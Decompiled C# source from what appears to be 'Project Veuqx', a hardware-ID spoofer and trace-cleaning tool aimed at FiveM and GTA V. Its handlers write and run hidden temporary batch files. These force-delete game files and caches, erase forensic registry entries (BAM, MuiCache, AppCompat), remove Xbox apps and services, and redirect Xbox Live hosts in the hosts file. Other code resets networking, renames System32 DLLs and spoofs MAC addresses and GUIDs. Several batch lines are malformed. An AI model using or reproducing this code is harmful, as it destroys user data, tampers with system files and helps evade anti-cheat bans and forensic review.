				streamWriter.WriteLine("DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\botan.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam_api64.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc STARCHARMS_SPOOFER");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\mods\\*.* ");
				streamWriter.WriteLine(":folderclean");
				streamWriter.WriteLine("call :getDiscordVersion");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("goto :xboxclean");
				streamWriter.WriteLine(": getDiscordVersion");
				streamWriter.WriteLine("for / d %% a in (' % appdata%\\Discord\\*') do (");
				streamWriter.WriteLine("     set 'varLoc =%%a'");
				streamWriter.WriteLine("   goto :d1");
				streamWriter.WriteLine(")");
				streamWriter.WriteLine(":d1");
				streamWriter.WriteLine("for / f 'delims =\\ tokens=7' %% z in ('echo %varLoc%') do (");
				streamWriter.WriteLine("     set 'discordVersion =%%z'");
				streamWriter.WriteLine(")");
				streamWriter.WriteLine("goto :EOF");
				streamWriter.WriteLine(": xboxclean");
				streamWriter.WriteLine(" cls");
				streamWriter.WriteLine("powershell - Command ' & {Get-AppxPackage -AllUsers xbox | Remove-AppxPackage}'");
				streamWriter.WriteLine("sc stop XblAuthManager");
				streamWriter.WriteLine("sc stop XblGameSave");
				streamWriter.WriteLine("sc stop XboxNetApiSvc");
				streamWriter.WriteLine("sc stop XboxGipSvc");
				streamWriter.WriteLine("sc delete XblAuthManager");
				streamWriter.WriteLine("sc delete XblGameSave");
				streamWriter.WriteLine("sc delete XboxNetApiSvc");
				streamWriter.WriteLine("sc delete XboxGipSvc");
				streamWriter.WriteLine("reg delete 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\xbgm' / f");
				streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTask' / disable");
				streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTaskLogon' / disableL");
				streamWriter.WriteLine("reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\GameDVR' / v AllowGameDVR / t REG_DWORD / d 0 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
				streamWriter.WriteLine("   echo 127.0.0.1 xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("   echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath % ");
				streamWriter.WriteLine("   echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("   rd % userprofile %\\AppData\\Local\\DigitalEntitlements / q / s");
				streamWriter.WriteLine("exit");
				streamWriter.WriteLine("goto :eof");
			}
			Process.Start(text).WaitForExit();
			File.Delete(text);
			string path = "C:\\Program Files\\Win64";
			bool flag3 = !Directory.Exists(path);
			if (flag3)
			{
				Directory.CreateDirectory(path);
			}
			bool flag4 = File.Exists("C:\\Program Files\\Win64\\net.bat");
			if (flag4)
			{
				Process.Start("C:\\Program Files\\Win64\\net.bat");
			}
			else
			{
				string text2 = "C:\\Program Files\\Win64\\net.bat";
				using (StreamWriter streamWriter2 = File.CreateText(text2))
				{
					streamWriter2.WriteLine("netsh int ip reset");
				}
				Process process = new Process();
				process.StartInfo.FileName = text2;
				this.processlist.Add(process);
				File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
				process.Start();
			}
			string text3 = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
			using (StreamWriter streamWriter3 = new StreamWriter(text3))
			{
				streamWriter3.WriteLine("echo off");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("taskkill /f /im Steam.exe /t");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("set hostspath=%windir%\\System32\\drivers\\etc\\hosts");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\steam_api64.dll");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\DigitalEntitlements");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
				streamWriter3.WriteLine("cls");
				streamWriter3.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc Veuqx");
				streamWriter3.WriteLine("cls");
			}
			Process.Start(text3).WaitForExit();
			File.Delete(text3);
			Main.HWIDclick();
			Main.XBOXclick();
			Main.PC();
			Main.Diskclick();
			Main.FiveM();
			string path2 = "C:\\Program Files\\Win64";
			bool flag5 = !Directory.Exists(path2);
			if (flag5)
			{
				Directory.CreateDirectory(path2);
			}
			bool flag6 = File.Exists("C:\\Program Files\\Win64\\net.bat");
			if (flag6)
			{
				Process.Start("C:\\Program Files\\Win64\\net.bat");
				File.Delete("C:\\Program Files\\Win64\\net.bat");
			}
			else
			{
				string text4 = "C:\\Program Files\\Win64\\net.bat";
				using (StreamWriter streamWriter4 = File.CreateText(text4))
				{
					streamWriter4.WriteLine("netsh int ip reset");
				}
				Process process2 = new Process();
				process2.StartInfo.FileName = text4;
				this.processlist.Add(process2);
				File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
				process2.Start();
				Thread.Sleep(500);
				File.Delete("C:\\Program Files\\Win64\\net.bat");
			}
			bool flag7 = File.Exists("C:\\Windows\\System32\\nvml.dll");
			if (flag7)
			{
				try
				{
					File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
					File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
				}
				catch
				{
				}
			}
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			bool flag8 = Directory.Exists(folderPath + "\\DigitalEntitlements");
			if (flag8)
			{
				Directory.Delete(folderPath + "\\DigitalEntitlements", true);
			}
			bool flag9 = Directory.Exists(folderPath + "\\D3DSCache");
			if (flag9)
			{
				Directory.Delete(folderPath + "\\D3DSCache", true);
			}
			bool flag10 = Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\crashes");
			if (flag10)
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\crashes", true);
			}
			bool flag11 = Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\logs");
			if (flag11)
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\logs", true);
			}
			bool flag12 = Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data\\cache");
			if (flag12)
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\data\\cache", true);
			}
			bool flag13 = Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\citizen");
			if (flag13)
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\citizen", true);
			}
			bool flag14 = Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data");
			if (flag14)
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\data", true);
			}
			Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data\\server-cache");
			bool flag15 = Directory.Exists(folderPath2 + "\\CitizenFX");
			if (flag15)
			{
				Directory.Delete(folderPath2 + "\\CitizenFX", true);
			}
			string path3 = "C:\\Program Files\\Win64";
			bool flag16 = !Directory.Exists(path3);
			if (flag16)
			{
				Directory.CreateDirectory(path3);
			}
			try
			{
				bool flag17 = File.Exists("C:\\Program Files\\Microsoft\\nodejs.exe");
				if (flag17)
				{
					File.Delete("C:\\Program Files\\Microsoft\\nodejs.exe");
				}
			}
			catch
			{
			}
			int num = (int)MessageBox.Show("Successfully", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x0600009E RID: 158 RVA: 0x00009344 File Offset: 0x00009344
		private void guna2Button50_Click(object sender, EventArgs e)
		{
			string text = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine("@echo off");
				streamWriter.WriteLine("rmdir / s / q C:\\Program Files\\Epic Games\\GTAV\\reshade-shaders");
				streamWriter.WriteLine("del / s / q / f C:\\Program Files\\Epic Games\\GTAV\\Dxgi.dll");
				streamWriter.WriteLine("del / s / q / f C:\\Program Files\\Epic Games\\GTAV\\D3d10.dll");
				streamWriter.WriteLine("del / s / q / f C:\\Program Files\\Epic Games\\GTAV\\d3d9.dll");
				streamWriter.WriteLine("del / s / q / f C:\\Program Files\\Epic Games\\GTAV\\d3d8.dll");
				streamWriter.WriteLine("del / s / q / f C:\\Program Files\\Epic Games\\GTAV\\Dxgi.txt");
				streamWriter.WriteLine("rmdir / s / q D:\\Program Files\\Epic Games\\GTAV\\reshade-shaders");
				streamWriter.WriteLine("del / s / q / f D:\\Program Files\\Epic Games\\GTAV\\Dxgi.dll");
				streamWriter.WriteLine("del / s / q / f D:\\Program Files\\Epic Games\\GTAV\\D3d10.dll");
				streamWriter.WriteLine("del / s / q / f D:\\Program Files\\Epic Games\\GTAV\\d3d9.dll");
				streamWriter.WriteLine("del / s / q / f D:\\Program Files\\Epic Games\\GTAV\\d3d8.dll");
				streamWriter.WriteLine("del / s / q / f D:\\Program Files\\Epic Games\\GTAV\\dxgi.log");
				streamWriter.WriteLine("rmdir / s / q C:\\Program Files (x86)\\Steam\\steamapps\\common\\Grand Theft Auto V\\reshade-shaders");
				streamWriter.WriteLine("del / s / q / f C:\\Program Files (x86)\\Steam\\steamapps\\common\\Grand Theft Auto V\\Dxgi.dll");
				streamWriter.WriteLine("del / s / q / f C:\\Program Files (x86)\\Steam\\steamapps\\common\\Grand Theft Auto V\\D3d10.dll");
				streamWriter.WriteLine("del / s / q / f C:\\Program Files (x86)\\Steam\\steamapps\\common\\Grand Theft Auto V\\d3d9.dll");
				streamWriter.WriteLine("del / s / q / f C:\\Program Files (x86)\\Steam\\steamapps\\common\\Grand Theft Auto V\\d3d8.dll");
				streamWriter.WriteLine("del / s / q / f C:\\Program Files (x86)\\Steam\\steamapps\\common\\Grand Theft Auto V\\Dxgi.txt");
				streamWriter.WriteLine("del / s / q / f D:\\Program Files (x86)\\Steam\\steamapps\\common\\Grand Theft Auto V\\Dxgi.dll");
				streamWriter.WriteLine("del / s / q / f D:\\Program Files (x86)\\Steam\\steamapps\\common\\Grand Theft Auto V\\D3d10.dll");
				streamWriter.WriteLine("del / s / q / f D:\\Program Files (x86)\\Steam\\steamapps\\common\\Grand Theft Auto V\\d3d9.dll");
				streamWriter.WriteLine("del / s / q / f D:\\Program Files (x86)\\Steam\\steamapps\\common\\Grand Theft Auto V\\d3d8.dll");
				streamWriter.WriteLine("del / s / q / f D:\\Program Files (x86)\\Steam\\steamapps\\common\\Grand Theft Auto V\\Dxgi.txt");
				streamWriter.WriteLine("rmdir / s / q C:\\Program Files\\Rockstar Games\\Grand Theft Auto V\\reshade-shaders");
				streamWriter.WriteLine("del / s / q / f C:\\Program Files\\Rockstar Games\\Grand Theft Auto V\\Dxgi.dll");
				streamWriter.WriteLine("del / s / q / f C:\\Program Files\\Rockstar Games\\Grand Theft Auto V\\D3d10.dll");
				streamWriter.WriteLine("del / s / q / f C:\\Program Files\\Rockstar Games\\Grand Theft Auto V\\d3d9.dll");
				streamWriter.WriteLine("del / s / q / f C:\\Program Files\\Rockstar Games\\Grand Theft Auto V\\d3d8.dll");
				streamWriter.WriteLine("del / s / q / f C:\\Program Files\\Rockstar Games\\Grand Theft Auto V\\Dxgi.txt");
				streamWriter.WriteLine("rmdir / s / q D:\\Program Files\\Rockstar Games\\Grand Theft Auto V\\reshade-shaders");
				streamWriter.WriteLine("del / s / q / f D:\\Program Files\\Rockstar Games\\Grand Theft Auto V\\Dxgi.dll");
				streamWriter.WriteLine("del / s / q / f D:\\Program Files\\Rockstar Games\\Grand Theft Auto V\\D3d10.dll");
				streamWriter.WriteLine("del / s / q / f D:\\Program Files\\Rockstar Games\\Grand Theft Auto V\\d3d9.dll");
				streamWriter.WriteLine("del / s / q / f D:\\Program Files\\Rockstar Games\\Grand Theft Auto V\\d3d8.dll");
				streamWriter.WriteLine("del / s / q / f D:\\Program Files\\Rockstar Games\\Grand Theft Auto V\\Dxgi.txt");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\reshade-shaders");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\Dxgi.dll");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\D3d10.dll");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\d3d9.dll");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\d3d8.dll");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\Dxgi.txt");
			}
			Process process = Process.Start(text);
			process.WaitForExit();
			File.Delete(text);
			MessageBox.Show("Successfully", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x0600009F RID: 159 RVA: 0x000095B4 File Offset: 0x000095B4
		private void guna2Button45_Click(object sender, EventArgs e)
		{
			this.Spoof();
			Main.SpoofGUID();
			Main.GenerateRandomMAC();
			Main.HWIDclick();
			Main.XBOXclick();
			Main.PC();
			Main.Diskclick();
			MessageBox.Show("Successfully", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x04000010 RID: 16
		private static Random random = new Random();

		// Token: 0x04000011 RID: 17
		private static RegistryKey NetworkClass = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}\\");

		// Token: 0x04000012 RID: 18
		private RegistryKey NetworkInterface;

		// Token: 0x04000013 RID: 19
		private ManagementObject NetworkAdapter;

		// Token: 0x04000014 RID: 20
